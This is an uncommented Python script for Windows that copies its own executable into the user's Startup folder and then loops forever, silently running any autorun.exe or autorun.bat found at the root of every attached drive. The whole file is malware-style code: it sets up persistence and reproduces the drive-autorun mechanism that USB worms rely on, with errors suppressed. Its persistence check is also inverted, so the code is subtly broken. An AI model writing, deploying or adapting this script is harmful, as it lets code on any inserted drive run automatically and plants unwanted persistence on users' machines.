import os
import sys
import time
import subprocess
import shutil
if sys.platform == "win32":
    import win32api
    def autorun():
        drives = win32api.GetLogicalDriveStrings()
        drives = drives.split('\000')[:-1]
        for i in drives:
            try:
                if os.path.exists(f"{i}/autorun.exe"): 
                    subprocess.run(f"{i}/autorun.exe",capture_output=True)
            except:
                pass
            try:
                if os.path.exists(f"{i}/autorun.bat"): 
                    subprocess.run(f"{i}/autorun.bat")
            except:
                pass
        time.sleep(10)
    def persistence():
        if not os.path.exists(f"C:\\Users\\{os.getenv('username')}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"):
            shutil.copy(sys.executable, f"C:\\Users\\{os.getenv('username')}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    persistence()
    while True:
        autorun()
        time.sleep(10)
